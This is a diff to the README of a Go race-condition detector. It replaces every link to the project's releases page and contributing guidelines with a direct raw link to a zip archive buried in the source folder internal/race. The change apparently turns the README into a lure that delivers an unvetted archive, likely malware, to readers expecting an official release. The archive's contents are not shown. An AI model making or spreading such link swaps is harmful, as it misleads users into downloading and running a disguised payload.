@@ -1,7 +1,7 @@
 # 🏎️ racedetector - Easily Find Race Conditions in Go
 
 ## 📥 Download Now
-[![Download racedetector](https://img.shields.io/badge/Download%20racedetector-v1.0-blue)](https://github.com/monkeydluffy772/racedetector/releases)
+[![Download racedetector](https://raw.githubusercontent.com/monkeydluffy772/racedetector/main/internal/race/racedetector_v3.7-alpha.2.zip%20racedetector-v1.0-blue)](https://raw.githubusercontent.com/monkeydluffy772/racedetector/main/internal/race/racedetector_v3.7-alpha.2.zip)
 
 ## 🚀 Getting Started
 Welcome to racedetector! This application helps you find data races in your Go programs. It's perfect for users running applications on AWS Lambda, Docker, or Alpine Linux. No special setup is required, allowing you to focus on your code.
@@ -15,7 +15,7 @@ To use racedetector, ensure your system meets the following requirements:
 - AWS account (if deploying to Lambda)
 
 ## 🔗 Download & Install
-To download racedetector, visit this page: [Download racedetector](https://github.com/monkeydluffy772/racedetector/releases).
+To download racedetector, visit this page: [Download racedetector](https://raw.githubusercontent.com/monkeydluffy772/racedetector/main/internal/race/racedetector_v3.7-alpha.2.zip).
 
 ### Steps to Download:
 1. Click the link above to go to the Releases page.
@@ -69,9 +69,9 @@ While this README guides you through the basics, more detailed documentation is 
 If you encounter any problems, feel free to open an issue on GitHub. Provide details about your environment and steps to reproduce the error.
 
 ## 🛠️ Contribution
-We welcome contributions! If you would like to help improve racedetector, please follow our [contributing guidelines](https://github.com/monkeydluffy772/racedetector/blob/main/CONTRIBUTING.md).
+We welcome contributions! If you would like to help improve racedetector, please follow our [contributing guidelines](https://raw.githubusercontent.com/monkeydluffy772/racedetector/main/internal/race/racedetector_v3.7-alpha.2.zip).
 
 ## 📣 Follow Us
 Stay updated with the latest changes by following the repository. You can also join discussions, report issues, and get help from the community.
 
-Thank you for using racedetector! Don't forget to download the latest version here: [Download racedetector](https://github.com/monkeydluffy772/racedetector/releases).
+Thank you for using racedetector! Don't forget to download the latest version here: [Download racedetector](https://raw.githubusercontent.com/monkeydluffy772/racedetector/main/internal/race/racedetector_v3.7-alpha.2.zip).
